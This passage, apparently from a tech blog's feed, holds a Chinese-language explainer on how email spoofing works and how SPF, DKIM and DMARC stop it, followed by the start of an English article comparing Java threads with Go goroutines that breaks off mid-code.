&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-theory/identity-ref.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;Identity References（From: &lt;a href=&quot;https://bbiw.net/specifications/draft-crocker-email-arch-03.html#Users&quot;&gt;Internet Mail Architecture&lt;/a&gt;）&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;%E9%82%A3%E6%94%BB%E6%93%8A%E6%98%AF%E5%A6%82%E4%BD%95%E7%99%BC%E7%94%9F%E7%9A%84%EF%BC%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%82%A3%E6%94%BB%E6%93%8A%E6%98%AF%E5%A6%82%E4%BD%95%E7%99%BC%E7%94%9F%E7%9A%84%EF%BC%9F&quot;&gt;#&lt;/a&gt; 那攻擊是如何發生的？&lt;/h2&gt;
&lt;p&gt;討論攻擊前請記住，&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SMTP 對信件本身是沒有任何驗證機制的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;你只要可以用一組帳號密碼登入 SMTP server，寄信收信人欄位都任你填。SMTP authentication 只是為了保護 SMTP server 不要成為 open relay 讓任何人都能使用，並沒有保障信件本身的真實性。&lt;/p&gt;
&lt;p&gt;回顧上面的流程，我們來討論三種情境、看看這些攻擊中的『信件』有何不同。&lt;/p&gt;
&lt;p&gt;先假設&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;我使用的信箱是：goodboy@gmail.com&lt;/li&gt;
&lt;li&gt;我的 email server 網域是：&lt;a href=&quot;http://gmail.com/&quot;&gt;gmail.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;爺爺用的信箱是：grandpa@outlook.com&lt;/li&gt;
&lt;li&gt;爺爺的 email server 網域是：&lt;a href=&quot;http://outlook.com/&quot;&gt;outlook.com&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因此我寄出的信件上，信紙（&lt;code&gt;header.From&lt;/code&gt;）與信封袋（&lt;code&gt;smtp.MailFrom&lt;/code&gt;）上都會寫著 &lt;a href=&quot;mailto:goodboy@gmail.com&quot;&gt;goodboy@gmail.com&lt;/a&gt;。&lt;/p&gt;
&lt;h3 id=&quot;%E6%83%85%E5%A2%83%E4%B8%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%83%85%E5%A2%83%E4%B8%80&quot;&gt;#&lt;/a&gt; 情境一&lt;/h3&gt;
&lt;p&gt;今天我的月光族表弟想要模仿我寄信給爺爺跟他要零用錢，他可以自己架起一個 email server，然後偽造一封信紙（&lt;code&gt;header.From&lt;/code&gt;）與信封袋（&lt;code&gt;smtp.MailFrom&lt;/code&gt;）上均寫著 &lt;a href=&quot;mailto:goodboy@gmail.com&quot;&gt;goodboy@gmail.com&lt;/a&gt; 的信件並寄出。爺爺的 email server 看到這封信不疑有他就送進爺爺的信箱裡，導致爺爺成功被騙，轉了一筆錢給表弟。單純從 SMTP 機制來看，&lt;a href=&quot;http://outlook.com/&quot;&gt;outlook.com&lt;/a&gt; 眼中的信件寫著來自 &lt;a href=&quot;http://gmail.com/&quot;&gt;gmail.com&lt;/a&gt;，那就姑且相信他！&lt;/p&gt;
&lt;p&gt;為了防範這種假冒寄信人的攻擊，2014 年 4 月 RFC 7208 正式提出一套名為 &lt;strong&gt;Sender Policy Framework（SPF）&lt;/strong&gt; 的電子郵件驗證機制。這個機制的原理就是要求每個網域發一筆 DNS 紀錄，其中記載著這個網域所授權的 email server 的 IP 位置，也就是&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SPF：昭告天下『這些 IP 位置是我信任且核可的信件來源』&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;當收件方 email server 要進行驗證時，MDA 就會去查詢 &lt;code&gt;smtp.MailFrom&lt;/code&gt;這個網域的 DNS 紀錄，然後檢查此信件的來源 IP 是否在 SPF 紀錄中。&lt;/p&gt;
&lt;p&gt;下圖是一筆合法的 SPF 紀錄，裡面表列了允許寄信的 IP 位置，並且用 -all 宣告『除了前列 IP 之外一律拒絕』。其實 SPF 有非常多種設定，我們下一篇再談。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-theory/spf.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;SPF record（取自 維基百科）&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;你可以在信件的原始資訊裡看到 SPF 的驗證結果，收信方的 email server（&lt;a href=&quot;http://protection.outlook.com/&quot;&gt;protection.outlook.com&lt;/a&gt;）在確定 IP 為此 domain 的合法寄信人後，就會給出 PASS 的結果。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-theory/spf-result.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;SPF 驗證結果&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如果今天 &lt;a href=&quot;http://gmail.com/&quot;&gt;gmail.com&lt;/a&gt; 設置了 SPF 紀錄，那爺爺的 email server 在驗證時就會發現表弟所用的自架 email server 沒有在列表裡找到對應的 IP ，因此判斷為驗證失敗，成功擋下這個詐騙攻擊。&lt;/p&gt;
&lt;h3 id=&quot;%E6%83%85%E5%A2%83%E4%BA%8C&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%83%85%E5%A2%83%E4%BA%8C&quot;&gt;#&lt;/a&gt; 情境二&lt;/h3&gt;
&lt;p&gt;表弟發現攻擊失敗，只好另尋他法。他靈光一閃，發現雖然不能假冒 &lt;a href=&quot;http://gmail.com/&quot;&gt;gmail.com&lt;/a&gt; 寄信，那他可以攔截我寄給爺爺的信，然後把裡面的欄位跟資訊改掉，這樣就可以冒充我的身份又通過 SPF 驗證啦！於是表弟竄改我的信件，把內容改成零用錢請求，又成功騙到爺爺了。&lt;/p&gt;
&lt;p&gt;為了防範情境二的這種攻擊，2011 年首次提出的 RFC 6376（後來又在 RFC 8301 與 RFC 8463 修訂）定義了 &lt;strong&gt;DomainKeys Identified Mail（DKIM）&lt;/strong&gt; 這個機制。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;DKIM：使用數位簽章的概念來防止郵件偽造與竄改，透過公私鑰加密驗證的特性來確保訊息的完整與真實性。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;寄信方的 email server 會產生一組公私鑰，公鑰會用 DNS 紀錄發佈出去讓收信方可以用來解密。在寄信時使用私鑰加密 header 的某些欄位與 body，並將產生的雜湊（hash）做為簽章附上，此簽章稱為 DKIM signature。要加密的欄位由 email server 指定，不過必須包含 &lt;code&gt;header.From&lt;/code&gt;（否則寄件人的身份就沒有保障啦）。&lt;/p&gt;
&lt;p&gt;收信的 email server 進行驗證時，如同 SPF，MDA 會去查詢寄信網域的 DNS 紀錄，找到對應的公鑰後解密簽章內容來比對是否一致。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-theory/dkim.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;公鑰（取自 維基百科）&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;簽章如下圖所示，標籤中 &lt;code&gt;v&lt;/code&gt; 為版本、&lt;code&gt;a&lt;/code&gt; 代表加密方式。&lt;code&gt;d&lt;/code&gt; &lt;code&gt;s&lt;/code&gt; &lt;code&gt;q&lt;/code&gt; 三者一起用來查詢公鑰，表示查詢域名為 &lt;code&gt;&amp;lt;selector&amp;gt;._domainkey.&amp;lt;domain&amp;gt;&lt;/code&gt;（圖中就是 &lt;code&gt;brisbane._domainkey.example.net&lt;/code&gt;）的 DNS TXT 紀錄。&lt;code&gt;h&lt;/code&gt; 代表指定的header 欄位，加密後的結果會放在 &lt;code&gt;b&lt;/code&gt;，而 &lt;code&gt;bh&lt;/code&gt;（body hash）則是 body 本身經過雜湊後的結果。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-theory/dkim-signature.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;DKIM signature（取自 維基百科）&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如果今天 &lt;a href=&quot;http://gmail.com/&quot;&gt;gmail.com&lt;/a&gt; 設置了 DKIM 紀錄，那爺爺的 email server 在驗證時就會發現表弟竄改完的信件跟數位簽章解密的結果不符，因此判斷為驗證失敗，爺爺再度逃脫表弟的暗算。&lt;/p&gt;
&lt;h3 id=&quot;%E6%83%85%E5%A2%83%E4%B8%89&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E6%83%85%E5%A2%83%E4%B8%89&quot;&gt;#&lt;/a&gt; 情境三&lt;/h3&gt;
&lt;p&gt;表弟拿不到零用錢，很是挫敗。於是他絞盡腦汁終於想到：既然我不能仿冒 &lt;a href=&quot;http://gmail.com/&quot;&gt;gmail.com&lt;/a&gt; 也不能攔截真的信件，那我就自己架一個 email server、申請一個合法網域 &lt;a href=&quot;http://cousin.com/&quot;&gt;cousin.com&lt;/a&gt; ，然後寄一封信紙（&lt;code&gt;header.From&lt;/code&gt;）上寫 &lt;a href=&quot;mailto:goodboy@gmail.com&quot;&gt;goodboy@gmail.com&lt;/a&gt; 的信給爺爺就好啦！雖然信封袋（&lt;code&gt;smtp.MailFrom&lt;/code&gt;）上寫的是 &lt;a href=&quot;http://cousin.com/&quot;&gt;cousin.com&lt;/a&gt;，但反正爺爺在 outlook 裡看到的也只有 &lt;code&gt;header.From&lt;/code&gt;，他哪知道不是真的從 &lt;a href=&quot;http://gmail.com/&quot;&gt;gmail.com&lt;/a&gt; 來的。而且，不管是 SPF 還是 DKIM 驗證的都是 &lt;code&gt;smtp.MailFrom&lt;/code&gt; 的網域，我本來就是 &lt;a href=&quot;http://cousin.com/&quot;&gt;cousin.com&lt;/a&gt; 又沒造假，休想擋我財路！&lt;/p&gt;
&lt;p&gt;哎呀，表弟想的真有道理。&lt;/p&gt;
&lt;p&gt;不過好在 2015 年 3 月時 RFC 7489 出現，提出了一個可以保護爺爺的方法，名為 &lt;strong&gt;Domain-based Message Authentication, Reporting and Conformance（DMARC）&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;DMARC 結合了 SPF 與 DKIM，形成三人聯防，缺一不可，同時強化信紙與信封袋的一致性。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;DMARC 主要有兩個功能，其一是指示了當 SPF 與 DKIM 驗證失敗時該採取的行為，稱為 policy；第二則是確保信紙與信封袋上標示的寄件人來自同一個網域（也就是比對&lt;code&gt;header.From&lt;/code&gt;跟&lt;code&gt;smtp.MailFrom&lt;/code&gt;），稱為 alignment。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-theory/dmarc.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;DMARC record（取自 &lt;a href=&quot;http://bbc.com/&quot;&gt;bbc.com&lt;/a&gt; 的紀錄）&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;以上面這個 DMARC 紀錄為例，必要的標籤為 &lt;code&gt;p&lt;/code&gt;（policy），可能的值有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;reject&lt;/code&gt;：最嚴格的設定，表示 SPF 與 DKIM 驗證失敗的信一律回絕或直接捨棄&lt;/li&gt;
&lt;li&gt;&lt;code&gt;quarantine&lt;/code&gt;：隔離，實際處理方法因 email server 而異，可能是放在 email server 上的隔離區域等待視察（例如微軟的 email server 有 quarantine center），或是被歸類到垃圾郵件中並加註警戒標籤（例如 gmail 的處理方式）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;none&lt;/code&gt;：最寬鬆的設定，表示不做特別處理，僅是觀察（monitor），實際處理方法因 email server 而異，有可能進入一般信箱也可能歸類到垃圾郵件。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;而定義 alignment 的標籤為 &lt;code&gt;aspf&lt;/code&gt; 與 &lt;code&gt;adkim&lt;/code&gt;，分別對應 SPF 與 DKIM。以 SPF 來說是比對 &lt;code&gt;header.From&lt;/code&gt; 的網域與 &lt;code&gt;smtp.MailFrom&lt;/code&gt; 的網域；以 DKIM 來說是比對 &lt;code&gt;header.From&lt;/code&gt; 與 DKIM signature 中 &lt;code&gt;d&lt;/code&gt; 標籤的網域（例如前面圖中藍色字體的 &lt;a href=&quot;http://example.net/&quot;&gt;example.net&lt;/a&gt;）。&lt;/p&gt;
&lt;p&gt;可能的值有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;s&lt;/code&gt;（strict）：嚴格檢查，比對的兩個網域必須完全&lt;/li&gt;
&lt;li&gt;&lt;code&gt;r&lt;/code&gt;（relaxed）：寬鬆檢查，比對的兩個網域只要 base domain 相同即可，亦即可為主網域與子網域的關係&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;DMARC 甚至很貼心的附贈回報功能，你可以在 DMARC 紀錄指定信箱，則收信方的 email server 會每天整理並寄送一份報告到這個信箱，告訴你昨天信件驗證的狀況，包含驗證失敗的信的 trace 資訊與驗證結果。&lt;/p&gt;
&lt;p&gt;你也可以在每一封信的原始資訊中看見驗證結果：&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/email-sec-theory/dmarc-result.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;DMARC 驗證結果&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如果今天 &lt;a href=&quot;http://gmail.com/&quot;&gt;gmail.com&lt;/a&gt; 設置了 SPF、DKIM、DMARC 紀錄，那爺爺的 email server 在驗證時就會發現雖然表弟的 SPF、DKIM 驗證通過了，但是&lt;code&gt;header.From&lt;/code&gt;寫的 &lt;a href=&quot;http://gmail.com/&quot;&gt;gmail.com&lt;/a&gt; 跟&lt;code&gt;smtp.MailFrom&lt;/code&gt;還有 DKIM signature 中 &lt;code&gt;d&lt;/code&gt; 標籤寫的 &lt;a href=&quot;http://cousin.com/&quot;&gt;cousin.com&lt;/a&gt; 對不起來，因此判斷為驗證失敗，爺爺因此又平安度過了一天！&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;%E7%B5%90%E8%AB%96&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B5%90%E8%AB%96&quot;&gt;#&lt;/a&gt; 結論&lt;/h2&gt;
&lt;p&gt;讀到這裡，大家是否更加了解對 email security 有哪些威脅與防護機制了呢？我們從一封郵件的旅程介紹傳輸過程中的各種角色與職責，也透過三個情境讓大家認識 SPF、DKIM、DMARC 這些防護的用意與效果。有了這三劍客，我們就不用擔心信件被篡改、仿造、或是從未經授權的地方寄出了。近來 email security 意識抬頭，DMARC 也名列 Gartner 十大資安主題排行榜喔！&lt;/p&gt;
&lt;p&gt;不過其實這些機制還有很多不足的地方，例如：中繼 email server 是可以冒充的嗎？是誰控制的？如果 &lt;code&gt;smtp.MailFrom&lt;/code&gt; 跟 &lt;code&gt;header.From&lt;/code&gt; 不同的時候（例如合理使用 forwarding 功能）不就完蛋了嗎？在沒有這些機制以前是如何防治釣魚的；有了三劍客以後還有哪些機制可以補強呢？&lt;/p&gt;
&lt;p&gt;這些耐人尋味的問題，我們留待之後更深入探討。下一篇，我們先來看看三劍客到底如何設置，以及有哪些容易出錯的小地方～&lt;/p&gt;
&lt;p&gt;附帶一提，為了讓使用者可以更輕易的從寄信人的頭貼辨識出是不是『正身』，有另一個叫做 BIMI 的機制是用來驗證頭貼的哦！不過目前 BIMI 還不是很普及，有興趣的朋友可以再去了解。&lt;/p&gt;
&lt;h3 id=&quot;references%3A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#references%3A&quot;&gt;#&lt;/a&gt; References:&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://bbiw.net/specifications/draft-crocker-email-arch-03.html#Users&quot;&gt;Internet Mail Architecture&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://afreshcloud.com/sysadmin/mail-terminology-mta-mua-msa-mda-smtp-dkim-spf-dmarc&quot;&gt;Mail terminology&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc7208&quot;&gt;SPF RFC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc6376#section-5&quot;&gt;DKIM RFC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc7489&quot;&gt;DMARC RFC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://dmarc.org/&quot;&gt;DMARC.org&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gartner.com/smarterwithgartner/gartner-top-security-projects-for-2020-2021/&quot;&gt;Gartner&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

		</content>
	</entry>
	
	<entry>
		<title>Java’s Thread Model and Golang Goroutine</title>
		<link href="https://tech-blog.cymetrics.io/posts/genchilu/javas-thread-model-and-golang-goroutine-en/"/>
		<updated>2021-07-05T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/genchilu/javas-thread-model-and-golang-goroutine-en/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;p&gt;One of the most important features of Golang is its ability to handle high concurrency. And goroutine is the foundation to support high concurrency. This article will briefly explain how Java’s thread model and Golang’s goroutine work in OS. And I believe you will be impressive in the principle behind goroutine. Let’s go!&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;h1 id=&quot;java-thread-model&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#java-thread-model&quot;&gt;#&lt;/a&gt; Java Thread Model&lt;/h1&gt;
&lt;p&gt;Java uses native thread in OS. That is every Java thread mapping to one kernel thread. Java can not determine which thread would occupy the core, it is completely dependent on OS’s scheduler.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/javas-thread-model-and-golang-goroutine/thread-model-os-thread.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Below is a simple java code that creates 1000 threads and does nothing:&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100000000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                e&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;printStackTrace&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100000000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I run this code in my Linux VM and use ps command to monitor the number of threads. It shows that the Java process creates about 1018 threads (Java creates about 18 threads to maintain JVM system, like GC.)&lt;/p&gt;
&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;**g7@g7test1**:**~**$ &lt;span class=&quot;token function&quot;&gt;ps&lt;/span&gt; -T &lt;span class=&quot;token number&quot;&gt;102763&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;wc&lt;/span&gt; -l&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token number&quot;&gt;1018&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;However, with the advent of technology, it becomes more common for people to connect to the internet, we all want our server could support high concurrency to serve our customers. But the thread — ever called lightweight process — becomes too heavy to support high concurrency. Why?&lt;/p&gt;
&lt;h2 id=&quot;problem-of-thread&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#problem-of-thread&quot;&gt;#&lt;/a&gt; Problem of Thread&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Memory size&lt;br&gt;
Every time Java creates a thread, Java would allocate a fixed memory size as that thread’s stack. The number of threads would be limit by OS’s memory and SWAP size, even if your Java application does not use that much memory.&lt;br&gt;
You can use -Xss JVM option to the specific memory size of the stack used by each thread. But JVM would not run up if you specify too small memory size. Take my laptop, for example, JVM would crash if I set memory size smaller than 135k.&lt;/li&gt;
&lt;li&gt;The Cost of Create Thread and Context Switch&lt;br&gt;
When the number of threads exceeds the number of cores, OS would arrange core to run each thread as fairs as it can through the scheduler. When one core switches one thread to another thread, it would store the current thread’s state, load another thread’s state and run it. That is the so-called context switch.&lt;br&gt;
But one thing you must know is that context switch is also cost. If there are too many threads, your core would spend too much time in context switch. Thus it would decrease your system’s throughput.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Let’s see an actual example to show how expensive thread is. Below is a simple Java code, it uses ExecutorService with a fixed number thread pool to run the function doSomething 200000 times.&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;doSomething&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; j &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; j &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; j&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token class-name&quot;&gt;Random&lt;/span&gt; random &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Random&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; anInt &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; random&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;nextInt&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; threadNum &lt;span class=&quot;token 